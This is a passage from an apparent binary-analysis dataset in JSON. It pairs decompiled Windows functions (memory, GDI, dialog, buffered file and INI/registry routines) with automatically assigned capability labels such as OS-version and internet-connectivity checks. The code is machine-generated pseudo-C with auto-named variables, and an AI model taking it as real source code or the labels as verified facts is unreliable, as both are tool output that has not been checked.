        "decompiled_code": "\nbool __cdecl fcn.0042df35(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    \n    iVar1 = fcn.00431a77();\n    if ((*(iVar1 + 0x10) != 0) && (iVar2 = *(iVar1 + 0x10) + -1,  *(iVar1 + 0x10) = iVar2,  iVar2 == 0)) {\n        if (arg_8h != 0) {\n            if (((arg_8h != -1) && (iVar2 = fcn.0042852f(),  iVar2 != 0)) && (*(iVar2 + 0x38) != NULL)) {\n                (**(iVar2 + 0x38))(0, 0);\n            }\n            fcn.0042ded2();\n            fcn.0042ded2();\n            fcn.0042ded2();\n            fcn.0042ded2();\n            fcn.0042ded2();\n        }\n        iVar2 = fcn.00431a51();\n        iVar2 = *(iVar2 + 4);\n        iVar3 = fcn.004325ef();\n        if ((((iVar3 != 0) && (iVar2 != 0)) &&\n            ((*(iVar3 + 0xc) == 0 || (uVar4 = fcn.0041d585(*(iVar3 + 0xc)),  uVar4 < *(iVar2 + 0x94))))) &&\n           (*(iVar2 + 0x94) != 0)) {\n            arg_8h = 0;\n            if (*(iVar3 + 0xc) != 0) {\n                arg_8h = fcn.0041d585(*(iVar3 + 0xc));\n                fcn.0041ba6d(*(iVar3 + 0xc));\n            }\n            iVar2 = fcn.0041ba5b(*(iVar2 + 0x94));\n            *(iVar3 + 0xc) = iVar2;\n            if ((iVar2 == 0) && (arg_8h != 0)) {\n                uVar5 = fcn.0041ba5b(arg_8h);\n                *(iVar3 + 0xc) = uVar5;\n            }\n        }\n    }\n    return *(iVar1 + 0x10) != 0;\n}\n",
        "token_count": 535
    },
    "0042e0f8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0042e0f8(int32_t arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    \n    bVar6 = *(arg_8h + 2) == -1;\n    iVar2 = fcn.0042e0ad(arg_8h);\n    iVar3 = fcn.0042e02e(arg_8h);\n    if (iVar3 != 0) {\n        iVar2 = iVar2 + (bVar6 * 2 + 1) * 2;\n        iVar3 = fcn.0041c9c3(iVar2);\n        iVar2 = iVar2 + 2 + iVar3 * 2;\n    }\n    if (bVar6) {\n        uVar1 = *(arg_8h + 0x10);\n    }\n    else {\n        uVar1 = *(arg_8h + 8);\n    }\n    if (uVar1 != 0) {\n        uVar5 = uVar1;\n        do {\n            puVar4 = (iVar2 + 3U & 0xfffffffc) + (-bVar6 & 6) + 0x12;\n            if (*puVar4 == 0xffff) {\n                puVar4 = puVar4 + 2;\n            }\n            else {\n                do {\n                    uVar1 = *puVar4;\n                    puVar4 = puVar4 + 1;\n                } while (uVar1 != 0);\n            }\n            if (*puVar4 == 0xffff) {\n                puVar4 = puVar4 + 2;\n            }\n            else {\n                do {\n                    uVar1 = *puVar4;\n                    puVar4 = puVar4 + 1;\n                } while (uVar1 != 0);\n            }\n            uVar1 = *puVar4;\n            if ((uVar1 != 0) && (!bVar6)) {\n                uVar1 = uVar1 - 2;\n            }\n            uVar5 = uVar5 - 1;\n            iVar2 = puVar4 + uVar1 + 2;\n        } while (uVar5 != 0);\n    }\n    return iVar2 - arg_8h;\n}\n",
        "token_count": 516
    },
    "0042e1bb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042e1bb(uint lpMultiByteStr, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    ushort *puVar5;\n    uint32_t arg_ch_00;\n    uint *in_ECX;\n    int32_t iVar6;\n    int16_t iVar7;\n    uint32_t arg_8h;\n    bool bVar8;\n    uint var_54h;\n    uint hMem;\n    uint var_4ch;\n    uint var_48h;\n    uint lpWideCharStr;\n    uint var_4h;\n    \n    var_4h = *0x444220;\n    if (in_ECX[1] != 0) {\n        puVar2 = (*_sym.imp.KERNEL32.dll_GlobalLock)(*in_ECX);\n        bVar8 = *(puVar2 + 2) == -1;\n        iVar3 = fcn.0042e02e(puVar2);\n        iVar1 = bVar8 * 2 + 1;\n        if (bVar8) {\n            puVar2[3] = puVar2[3] | 0x40;\n        }\n        else {\n            *puVar2 = *puVar2 | 0x40;\n        }\n        iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpMultiByteStr);\n        if (iVar4 < 0x20) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, lpMultiByteStr, 0xffffffff, &lpWideCharStr, 0x20)\n            ;\n            iVar4 = iVar1 * 2 + iVar4 * 2;\n            puVar5 = fcn.0042e0ad(puVar2);\n            iVar6 = 0;\n            if (iVar3 != 0) {\n                iVar3 = fcn.0041c9c3(puVar5 + iVar1);\n                iVar6 = iVar1 * 2 + 2 + iVar3 * 2;\n            }\n            arg_ch_00 = iVar6 + 3 + puVar5 & 0xfffffffc;\n            arg_8h = puVar5 + iVar4 + 3 & 0xfffffffc;\n            if (bVar8) {\n                iVar7 = *(puVar2 + 4);\n            }\n            else {\n                iVar7 = *(puVar2 + 2);\n            }\n            if ((iVar4 != iVar6) && (iVar7 != 0)) {\n                fcn.0041b0f0(arg_8h, arg_ch_00, puVar2 + (in_ECX[1] - arg_ch_00));\n            }\n            *puVar5 = arg_ch;\n            fcn.0041b0f0(puVar5 + iVar1, &lpWideCharStr, iVar4 + iVar1 * -2);\n            in_ECX[1] = in_ECX[1] + (arg_8h - arg_ch_00);\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*in_ECX);\n            in_ECX[2] = 0;\n        }\n    }\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 714
    },
    "0042e2f3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042e2f3(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    char *lpMultiByteStr;\n    uint var_44h;\n    int32_t lpvObject;\n    uint var_24h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.GDI32.dll_GetStockObject;\n    uVar4 = 10;\n    var_4h = *0x444220;\n    lpMultiByteStr = \"System\";\n    iVar2 = (*_sym.imp.GDI32.dll_GetStockObject)(0x11);\n    if (iVar2 == 0) {\n        iVar2 = (*pcVar1)(0xd);\n        if (iVar2 == 0) goto code_r0x0042e36c;\n    }\n    iVar2 = (*_sym.imp.GDI32.dll_GetObjectA)(iVar2, 0x3c, &lpvObject);\n    if (iVar2 != 0) {\n        lpMultiByteStr = &var_24h;\n        uVar3 = (*_sym.imp.USER32.dll_GetDC)(0);\n        if (lpvObject < 0) {\n            lpvObject = -lpvObject;\n        }\n        uVar4 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(uVar3, 0x5a);\n        uVar4 = (*_sym.imp.KERNEL32.dll_MulDiv)(lpvObject, 0x48, uVar4);\n        (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar3);\n    }\ncode_r0x0042e36c:\n    if (arg_8h == 0) {\n        arg_8h = uVar4;\n    }\n    fcn.0042e1bb(lpMultiByteStr, arg_8h);\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 428
    },
    "0042e424": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0042e424(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    iVar1 = fcn.00431a77();\n    if ((*(iVar1 + 0x18) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.00428f9f(0x42fc99);\n        iVar3 = fcn.00428fb1(0x60);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.0042dd8c(0x43a31c, 0x432cd6, 0x43229d, 4, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x18) = uVar4;\n        fcn.00428f9f(uVar2);\n    }\n    uVar2 = *(iVar1 + 0x18);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 368
    },
    "0042e873": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0042e873(int32_t param_1, uint param_2)\n\n{\n    uint arg_8h;\n    int32_t arg_10h;\n    \n    if (param_1 != 0) {\n        arg_10h = param_1;\n        arg_8h = fcn.0042e508(param_1, param_1, param_2);\n        fcn.0042e82d(arg_8h, param_1, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 114
    },
    "0042f095": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0042f095(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    iVar1 = fcn.00431a77();\n    if ((*(iVar1 + 0x1c) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.00428f9f(0x42fc99);\n        iVar3 = fcn.00428fb1(0x60);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.0042dd8c(0x4397f0, 0x4322e6, 0x43229d, 4, 2);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x1c) = uVar4;\n        fcn.00428f9f(uVar2);\n    }\n    uVar2 = *(iVar1 + 0x1c);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 372
    },
    "0042f187": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042f187(code **param_1)\n\n{\n    uint uVar1;\n    \n    *param_1 = vtable.CDC.0;\n    if (param_1[1] != NULL) {\n        uVar1 = fcn.0042f156();\n        (*_sym.imp.GDI32.dll_DeleteDC)(uVar1);\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "0042f37c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0042f37c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    iVar1 = fcn.00431a77();\n    if ((*(iVar1 + 0x20) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.00428f9f(0x42fc99);\n        iVar3 = fcn.00428fb1(0x60);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.0042dd8c(0x439750, 0x432302, 0x43229d, 4, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x20) = uVar4;\n        fcn.00428f9f(uVar2);\n    }\n    uVar2 = *(iVar1 + 0x20);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 366
    },
    "0042f5a7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0042f5a7(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    if ((arg_ch == 0) || (arg_8h == 0)) {\n        iVar1 = 0;\n    }\n    else {\n        if ((*(in_ECX + 0x18) & 1) == 0) {\n            fcn.0042fb6a(4, *(in_ECX + 0x14));\n        }\n        uVar3 = *(in_ECX + 0x2c) - *(in_ECX + 0x28);\n        if (arg_ch < uVar3) {\n            uVar3 = arg_ch;\n        }\n        fcn.0041c370(arg_8h, *(in_ECX + 0x28), uVar3);\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + uVar3;\n        arg_8h = arg_8h + uVar3;\n        uVar3 = arg_ch - uVar3;\n        if (uVar3 != 0) {\n            iVar1 = uVar3 - uVar3 % *(in_ECX + 0x20);\n            var_8h = 0;\n            var_4h = iVar1;\n            do {\n                iVar2 = (**(**(in_ECX + 0x24) + 0x34))(arg_8h, var_4h);\n                arg_8h = arg_8h + iVar2;\n                var_8h = var_8h + iVar2;\n                var_4h = var_4h - iVar2;\n                if (iVar2 == 0) break;\n            } while (var_4h != 0);\n            uVar3 = uVar3 - var_8h;\n            if ((uVar3 != 0) && (var_8h == iVar1)) {\n                uVar4 = 0;\n                if (*(in_ECX + 8) == 0) {\n                    if ((*(in_ECX + 0xc) != 0) || (var_4h = *(in_ECX + 0x20),  *(in_ECX + 0x20) < uVar3)) {\n                        var_4h = uVar3;\n                    }\n                    var_8h = *(in_ECX + 0x30);\n                    do {\n                        iVar1 = (**(**(in_ECX + 0x24) + 0x34))(var_8h, var_4h);\n                        var_8h = var_8h + iVar1;\n                        var_4h = var_4h - iVar1;\n                        uVar4 = uVar4 + iVar1;\n                        if ((iVar1 == 0) || (var_4h == 0)) break;\n                    } while (uVar4 < uVar3);\n                    iVar1 = *(in_ECX + 0x30);\n                    *(in_ECX + 0x2c) = iVar1 + uVar4;\n                }\n                else {\n                    (**(**(in_ECX + 0x24) + 0x50))(0, *(in_ECX + 0x20), in_ECX + 0x30, in_ECX + 0x2c);\n                    iVar1 = *(in_ECX + 0x30);\n                }\n                uVar4 = *(in_ECX + 0x2c) - iVar1;\n                *(in_ECX + 0x28) = iVar1;\n                if (uVar3 < uVar4) {\n                    uVar4 = uVar3;\n                }\n                fcn.0041c370(arg_8h, iVar1, uVar4);\n                *(in_ECX + 0x28) = *(in_ECX + 0x28) + uVar4;\n                uVar3 = uVar3 - uVar4;\n            }\n        }\n        iVar1 = arg_ch - uVar3;\n    }\n    return iVar1;\n}\n",
        "token_count": 935
    },
    "0042f74b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042f74b(uint32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint32_t arg_8h_00;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint unaff_EBX;\n    int32_t iVar4;\n    uint unaff_ESI;\n    int32_t iVar6;\n    uint var_8h;\n    uint32_t var_4h;\n    uint32_t uVar5;\n    \n    if ((*(in_ECX + 0x18) & 1) != 0) {\n        uVar5 = *(in_ECX + 0x28);\n        piVar1 = in_ECX + 0x2c;\n        var_4h = *piVar1 - uVar5;\n        uVar2 = arg_8h + var_4h;\n        if (*(in_ECX + 8) == 0) {\n            arg_8h_00 = *(in_ECX + 0x30);\n            if (arg_8h_00 < uVar5) {\n                if (0 < var_4h) {\n                    fcn.0041b0f0(arg_8h_00, uVar5, var_4h);\n                    arg_8h_00 = *(in_ECX + 0x30);\n                    *(in_ECX + 0x28) = arg_8h_00;\n                    *piVar1 = arg_8h_00 + var_4h;\n                }\n                uVar5 = arg_8h;\n                if (*(in_ECX + 0xc) == 0) {\n                    uVar5 = *(in_ECX + 0x20);\n                }\n                iVar4 = uVar5 - var_4h;\n                iVar6 = var_4h + arg_8h_00;\n                do {\n                    iVar3 = (**(**(in_ECX + 0x24) + 0x34))(iVar6, iVar4);\n                    var_4h = var_4h + iVar3;\n                    iVar6 = iVar6 + iVar3;\n                    iVar4 = iVar4 - iVar3;\n                    if ((iVar3 == 0) || (iVar4 == 0)) break;\n                } while (var_4h < arg_8h);\n                *(in_ECX + 0x28) = *(in_ECX + 0x30);\n                *(in_ECX + 0x2c) = *(in_ECX + 0x30) + var_4h;\n            }\n        }\n        else {\n            if (var_4h != 0) {\n                (**(**(in_ECX + 0x24) + 0x28))(-var_4h, -var_4h >> 0x1f, 1);\n            }\n            (**(**(in_ECX + 0x24) + 0x50))(0, *(in_ECX + 0x20), in_ECX + 0x30, piVar1);\n            *(in_ECX + 0x28) = *(in_ECX + 0x30);\n        }\n        if (uVar2 <= *(in_ECX + 0x2c) - *(in_ECX + 0x28)) {\n            return;\n        }\n        unaff_EBX = 0;\n        unaff_ESI = 3;\n    }\n    fcn.0042fb6a(unaff_ESI, unaff_EBX);\n    return;\n}\n",
        "token_count": 769
    },
    "0042f841": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042f841(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t in_ECX;\n    uint32_t arg_10h;\n    int32_t iVar1;\n    \n    if ((arg_ch != 0) && (arg_8h != 0)) {\n        if ((~*(in_ECX + 0x18) & 1) == 0) {\n            fcn.0042fb6a(2, *(in_ECX + 0x14));\n        }\n        arg_10h = *(in_ECX + 0x2c) - *(in_ECX + 0x28);\n        if (arg_ch < arg_10h) {\n            arg_10h = arg_ch;\n        }\n        fcn.0041c370(*(in_ECX + 0x28), arg_8h, arg_10h);\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + arg_10h;\n        arg_ch = arg_ch - arg_10h;\n        if (arg_ch != 0) {\n            fcn.0042f6d4();\n            iVar1 = arg_ch - arg_ch % *(in_ECX + 0x20);\n            (**(**(in_ECX + 0x24) + 0x38))(arg_8h + arg_10h, iVar1);\n            if (*(in_ECX + 8) != 0) {\n                (**(**(in_ECX + 0x24) + 0x50))(1, *(in_ECX + 0x20), in_ECX + 0x30, in_ECX + 0x2c);\n                *(in_ECX + 0x28) = *(in_ECX + 0x30);\n            }\n            fcn.0041c370(*(in_ECX + 0x28), arg_8h + arg_10h + iVar1, arg_ch - iVar1);\n            *(in_ECX + 0x28) = *(in_ECX + 0x28) + (arg_ch - iVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 474
    },
    "0042f94d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0042f94d(void)\n\n{\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *(unaff_EBP + -4) = 0;\n    if ((*(extraout_ECX + 0x24) != 0) && ((*(extraout_ECX + 0x18) & 2) == 0)) {\n        fcn.0042f833();\n    }\n    fcn.0042f565();\n    fcn.004011b0();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 205
    },
    "0042fe8f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0042fe8f(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = fcn.00411a01();\n    if (piVar1 != NULL) {\n        iVar2 = (**(*piVar1 + 0x120))();\n        if ((iVar2 != 0) && (piVar1[0x1f] != 0)) {\n    // WARNING: Could not recover jumptable at 0x0042feb5. Too many branches\n    // WARNING: Treating indirect jump as call\n            (**(*piVar1[0x1f] + 100))();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "0043008d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0042ffc0)\n// WARNING: Removing unreachable block (ram,0x00430011)\n\nvoid fcn.0043008d(uint param_1, uint32_t param_2, int32_t param_3)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack276;\n    int32_t iStack272;\n    uchar auStack268 [259];\n    uchar uStack9;\n    uint uStack8;\n    \n    uStack8 = 0x430095;\n    iVar4 = fcn.00431a51();\n    if (*(iVar4 + 4) != NULL) {\n    // WARNING: Could not recover jumptable at 0x004300a1. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(**(iVar4 + 4) + 0x98))();\n        return;\n    }\n    uStack8 = *0x444220;\n    fcn.0042fe8f(0);\n    iVar4 = fcn.0042febc(0, &stack0xfffffef0);\n    if (iVar4 != iStack272) {\n        (*_sym.imp.USER32.dll_EnableWindow)(iVar4, 1);\n    }\n    if ((iVar4 == 0) || (piVar1 = (*_sym.imp.USER32.dll_SendMessageA)(iVar4, 0x376, 0, 0),  piVar1 == NULL)) {\n        piVar1 = NULL;\n    }\n    iStack276 = 0;\n    if ((piVar1 != NULL) && (iStack276 = *piVar1,  param_3 != 0)) {\n        *piVar1 = param_3 + 0x30000;\n    }\n    if (((param_2 & 0xf0) == 0) && ((uVar2 = param_2 & 0xf,  uVar2 < 2 || ((2 < uVar2 && (uVar2 < 5)))))) {\n        param_2 = param_2 | 0x30;\n    }\n    auStack268[0] = 0;\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, &stack0xfffffef4, 0x104);\n    if (iVar3 == 0x104) {\n        uStack9 = 0;\n    }\n    (*_sym.imp.USER32.dll_MessageBoxA)(iVar4, param_1, &stack0xfffffef4, param_2);\n    if (piVar1 != NULL) {\n        *piVar1 = iStack276;\n    }\n    if (iStack272 != 0) {\n        (*_sym.imp.USER32.dll_EnableWindow)(iStack272, 1);\n    }\n    fcn.0042fe8f(1);\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 650
    },
    "00430122": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00430122(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    \n    iVar1 = arg_8h;\n    fcn.0042cdc9(arg_8h, &arg_8h);\n    if (arg_8h == 0) {\n        iVar2 = fcn.0042cd92(iVar1);\n        if (iVar2 == 0) {\n            fcn.0042759c();\n        }\n    }\n    *(in_ECX + 0xc) = 0;\n    *(in_ECX + 8) = iVar1;\n    return arg_8h;\n}\n",
        "token_count": 157
    },
    "00430161": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00430161(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = arg_10h;\n    if (*(arg_10h + 0x1c) != 0) {\n        return;\n    }\n    iVar1 = fcn.0042cd70();\n    if (iVar1 != 0) {\n        return;\n    }\n    fcn.00430122(arg_ch);\n    fcn.0042cdc9(arg_ch, &arg_10h);\n    if (arg_10h != 0) {\n        iVar1 = fcn.0042b8d0(arg_10h);\n        if (iVar1 == 0) {\n            fcn.0042759c();\n        }\n        if (arg_10h != 0) {\n            iVar1 = *(arg_8h + 4);\n            iVar2 = (*_sym.imp.USER32.dll_GetParent)(*(iVar2 + 0x1c));\n            if (*(iVar1 + 0x1c) == iVar2) {\n                return;\n            }\n            arg_ch = 0;\n            goto code_r0x004301dc;\n        }\n    }\n    iVar2 = fcn.0042cd92(arg_ch);\n    if (iVar2 == 0) {\n        return;\n    }\n    iVar1 = *(arg_8h + 4);\ncode_r0x004301dc:\n    fcn.0042cfeb(iVar1, arg_ch);\n    return;\n}\n",
        "token_count": 345
    },
    "004302ba": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004302ba(uint lpAppName, uint lpValueName, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint lpString;\n    uint var_4h;\n    \n    var_4h = *0x444220;\n    if (*(in_ECX + 0x50) == 0) {\n        (*_sym.imp.USER32.dll_wsprintfA)(&lpString, 0x439704, arg_10h);\n        (*_sym.imp.KERNEL32.dll_WritePrivateProfileStringA)(lpAppName, lpValueName, &lpString, *(in_ECX + 100));\n    }\n    else {\n        iVar1 = fcn.00432b59(lpAppName);\n        if (iVar1 != 0) {\n            (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(iVar1, lpValueName, 0, 4, &arg_10h, 4);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iVar1);\n        }\n    }\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 245
    },
    "0043070f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043070f(int32_t *arg_8h, uint8_t *arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    \n    iVar4 = 0;\n    uVar1 = *arg_ch;\n    puVar5 = arg_ch;\n    while (uVar1 != 0) {\n        if (*puVar5 == 0x25) {\n            uVar1 = puVar5[1];\n            if ((uVar1 < '1') || ('9' < uVar1)) {\n                if ((uVar1 < 'A') || ('Z' < uVar1)) goto code_r0x00430768;\n                if (uVar1 < ':') goto code_r0x00430746;\n                iVar3 = uVar1 + -0x38;\n            }\n            else {\ncode_r0x00430746:\n                iVar3 = uVar1 + -0x31;\n            }\n            puVar5 = puVar5 + 2;\n            if (arg_14h <= iVar3) goto code_r0x00430777;\n            iVar3 = *(arg_10h + iVar3 * 4);\n            if (iVar3 != 0) {\n                iVar3 = 